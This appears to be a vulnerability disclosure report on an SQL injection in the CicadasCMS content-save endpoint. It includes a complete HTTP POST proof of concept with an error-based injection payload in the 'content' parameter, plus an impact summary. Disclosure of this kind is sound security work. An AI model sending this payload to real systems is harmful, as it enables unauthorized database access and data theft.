### 💥 Vulnerability Report : SQL Injection in

------

**1. Product:**

- **Name:**  CicadasCMS
- **Version:** latest version
- **Repository:** https://gitee.com/westboy/CicadasCMS

------

**2. Vulnerability Type:**

- **Type:** SQL Injection (SQLi)

------

**3. Affected Component(s):**

- /content/save

------

**4. Attack Vector(s):**

Attackers can inject malicious SQL statements through the content parameter in the save interface. The backend directly obtains this parameter without input filtering or parameter precompilation, leading to SQL injection.

**5. Proof of Concept (PoC):**

```
POST /system/cms/content/save HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 751
Origin: http://localhost
Connection: close
Referer: http://localhost/system
Cookie: bjui_theme=blue; SESSION=f43bf728-f5bf-4110-9b1f-58cca099b88a
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

contentId=1249&userId=1&siteId=1&tableName=&status=0&title=%E4%B9%98%E7%9D%80%E6%AD%8C%E5%A3%B0%E7%9A%84%E7%BF%85%E8%86%80%E2%80%94%E2%80%94XXX%E5%B8%82%E9%9F%B3%E4%B9%90%E5%AE%B6%E5%8D%8F%E4%BC%9A%E6%96%87%E8%89%BA%E5%BF%97%E6%84%BF%E5%B0%8F%E5%88%86%E9%98%9F%E8%B5%B0%E8%BF%9B%E5%B8%82%E7%AC%AC%E5%9B%9B%E4%B8%AD%E5%AD%A6&keywords=XXX%E5%B8%82%E9%9F%B3%E4%B9%90%E5%AE%B6%E5%8D%8F%E4%BC%9A%E6%96%87%E8%89%BA%E5%BF%97%E6%84%BF%E5%B0%8F%E5%88%86%E9%98%9F%E8%B5%B0%E8%BF%9B%E5%B8%82%E7%AC%AC%E5%9B%9B%E4%B8%AD%E5%AD%A6&description=&categoryId=226&thumb=&url=&recommend=on&viewNum=242&author=%E9%83%AD%E5%B0%8F%E5%88%9A&tags=&content=' OR (SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))) OR '1&fujian=&laiyuan=XXX%E5%B8%82%E6%96%87%E8%81%94
```



If vulnerable, the response will contain an error message such as:



![image-20251030094805612](C:\Users\王小二\AppData\Roaming\Typora\typora-user-images\image-20251030094805612.png)

**6. Vulnerable Code Reference**

src/main/java/com/zhiliao/module/web/cms/ContentController.java

![](C:\Users\王小二\AppData\Roaming\Typora\typora-user-images\image-20251030095204805.png)

src/main/java/com/zhiliao/module/web/cms/ContentController.java

![image-20251030100422988](C:\Users\王小二\AppData\Roaming\Typora\typora-user-images\image-20251030100422988.png)





src/main/java/com/zhiliao/module/web/cms/service/impl/ContentServiceImpl.java

![image-20251030100317828](C:\Users\王小二\AppData\Roaming\Typora\typora-user-images\image-20251030100317828.png)

src/main/java/com/zhiliao/module/web/cms/service/impl/ContentServiceImpl.java

![image-20251030095852738](C:\Users\王小二\AppData\Roaming\Typora\typora-user-images\image-20251030095852738.png)

src/main/java/com/zhiliao/module/web/cms/service/impl/ContentServiceImpl.java

![image-20251030095811962](C:\Users\王小二\AppData\Roaming\Typora\typora-user-images\image-20251030095811962.png)



The above code receives the 'content' parameter input from the client and directly concatenates it into the SQL statement without any filtering or precompilation. Therefore, an attacker can inject SQL statements through the 'content' parameter, leading to an SQL injection vulnerability.



**7. Impact:**

- Data leakage (e.g., database users, names)
- Potential unauthorized access
- Escalation to full compromise depending on DBMS



**8. References:**

https://gitee.com/westboy/CicadasCMS